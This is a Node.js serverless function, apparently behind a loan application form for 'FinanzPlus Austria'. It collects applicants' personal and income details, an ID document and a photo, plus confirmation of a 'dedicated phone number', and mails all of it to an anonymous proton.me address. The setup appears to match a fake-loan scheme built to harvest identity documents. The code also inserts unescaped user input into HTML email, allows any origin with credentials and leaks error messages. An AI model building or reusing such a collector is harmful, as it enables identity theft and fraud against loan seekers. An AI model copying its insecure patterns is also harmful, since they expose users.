// Vercel Serverless Function pour le formulaire FinanzPlus Austria
const nodemailer = require('nodemailer');
const formidable = require('formidable');

// Configuration CORS
const allowCors = fn => async (req, res) => {
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
  res.setHeader(
    'Access-Control-Allow-Headers',
    'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version'
  );
  
  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }
  
  return await fn(req, res);
};

const handler = async (req, res) => {
  if (req.method !== 'POST') {
    return res.status(405).json({ success: false, message: 'Method not allowed' });
  }

  try {
    // Parse le formulaire avec formidable
    const form = formidable({
      maxFileSize: 10 * 1024 * 1024, // 10MB
      keepExtensions: true
    });

    const [fields, files] = await new Promise((resolve, reject) => {
      form.parse(req, (err, fields, files) => {
        if (err) reject(err);
        resolve([fields, files]);
      });
    });

    // Extraire les données
    const {
      nom,
      prenom,
      age,
      adresse,
      telephone,
      travail,
      revenuMensuel,
      accepteConditions
    } = fields;

    // Validation
    if (!nom || !prenom || !age || !adresse || !telephone || !travail || !revenuMensuel) {
      return res.status(400).json({
        success: false,
        message: 'Alle Pflichtfelder müssen ausgefüllt werden'
      });
    }

    if (accepteConditions !== 'true') {
      return res.status(400).json({
        success: false,
        message: 'Sie müssen die Teilnahmebedingungen akzeptieren'
      });
    }

    // Configuration de Nodemailer
    const transporter = nodemailer.createTransport({
      host: process.env.EMAIL_HOST || 'smtp.protonmail.com',
      port: process.env.EMAIL_PORT || 587,
      secure: false,
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS
      }
    });

    // Préparer les pièces jointes
    const attachments = [];
    
    if (files.identityDocument) {
      const idDoc = Array.isArray(files.identityDocument) ? files.identityDocument[0] : files.identityDocument;
      attachments.push({
        filename: `identite_${nom}_${prenom}${idDoc.originalFilename.substring(idDoc.originalFilename.lastIndexOf('.'))}`,
        path: idDoc.filepath
      });
    }

    if (files.photo) {
      const photoDoc = Array.isArray(files.photo) ? files.photo[0] : files.photo;
      attachments.push({
        filename: `photo_${nom}_${prenom}${photoDoc.originalFilename.substring(photoDoc.originalFilename.lastIndexOf('.'))}`,
        path: photoDoc.filepath
      });
    }

    // Email HTML
    const mailOptions = {
      from: process.env.EMAIL_USER,
      to: 'kontakt_finanzplusaustria@proton.me',
      subject: `Neue Kreditanfrage - ${prenom} ${nom}`,
      html: `
        <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
          <h2 style="color: #2c3e50; border-bottom: 3px solid #3498db; padding-bottom: 10px;">
            Neue Kreditanfrage FinanzPlus Austria
          </h2>
          
          <h3 style="color: #34495e; margin-top: 30px;">📋 PERSÖNLICHE INFORMATIONEN</h3>
          <table style="width: 100%; border-collapse: collapse;">
            <tr>
              <td style="padding: 8px; background-color: #ecf0f1;"><strong>Nachname:</strong></td>
              <td style="padding: 8px;">${nom}</td>
            </tr>
            <tr>
              <td style="padding: 8px; background-color: #ecf0f1;"><strong>Vorname:</strong></td>
              <td style="padding: 8px;">${prenom}</td>
            </tr>
            <tr>
              <td style="padding: 8px; background-color: #ecf0f1;"><strong>Alter:</strong></td>
              <td style="padding: 8px;">${age} Jahre</td>
            </tr>
            <tr>
              <td style="padding: 8px; background-color: #ecf0f1;"><strong>Adresse:</strong></td>
              <td style="padding: 8px;">${adresse}</td>
            </tr>
          </table>

          <h3 style="color: #34495e; margin-top: 30px;">📞 KONTAKTDATEN</h3>
          <table style="width: 100%; border-collapse: collapse;">
            <tr>
              <td style="padding: 8px; background-color: #ecf0f1;"><strong>Telefon:</strong></td>
              <td style="padding: 8px;">${telephone}</td>
            </tr>
          </table>

          <h3 style="color: #34495e; margin-top: 30px;">💼 BERUFLICHE INFORMATIONEN</h3>
          <table style="width: 100%; border-collapse: collapse;">
            <tr>
              <td style="padding: 8px; background-color: #ecf0f1;"><strong>Beruf:</strong></td>
              <td style="padding: 8px;">${travail}</td>
            </tr>
            <tr>
              <td style="padding: 8px; background-color: #ecf0f1;"><strong>Monatliches Einkommen:</strong></td>
              <td style="padding: 8px;">${revenuMensuel} €</td>
            </tr>
          </table>

          <h3 style="color: #34495e; margin-top: 30px;">📎 DOKUMENTE BEIGEFÜGT</h3>
          <ul style="list-style: none; padding: 0;">
            <li style="padding: 5px 0;">✓ Personalausweis / Reisepass</li>
            <li style="padding: 5px 0;">✓ Lichtbild</li>
          </ul>

          <div style="margin-top: 30px; padding: 15px; background-color: #d5f4e6; border-left: 4px solid #27ae60;">
            <strong style="color: #27ae60;">✓ Teilnahmebedingungen akzeptiert</strong>
            <p style="margin: 5px 0 0 0; font-size: 14px;">Der Antragsteller bestätigt, über eine dedizierte Telefonnummer zu verfügen.</p>
          </div>

          <div style="margin-top: 30px; padding: 15px; background-color: #f8f9fa; border-top: 2px solid #dee2e6;">
            <p style="margin: 0; font-size: 12px; color: #6c757d;">
              Einreichungsdatum: ${new Date().toLocaleString('de-AT', { timeZone: 'Europe/Vienna' })}
            </p>
          </div>
        </div>
      `,
      attachments: attachments
    };

    // Envoi de l'email
    await transporter.sendMail(mailOptions);

    res.status(200).json({
      success: true,
      message: 'Ihr Antrag wurde erfolgreich eingereicht. Wir werden uns in Kürze bei Ihnen melden.'
    });

  } catch (error) {
    console.error('Fehler bei der Einreichung:', error);
    res.status(500).json({
      success: false,
      message: 'Bei der Übermittlung ist ein Fehler aufgetreten. Bitte versuchen Sie es erneut.',
      error: error.message
    });
  }
};

module.exports = allowCors(handler);

// Made with Bob
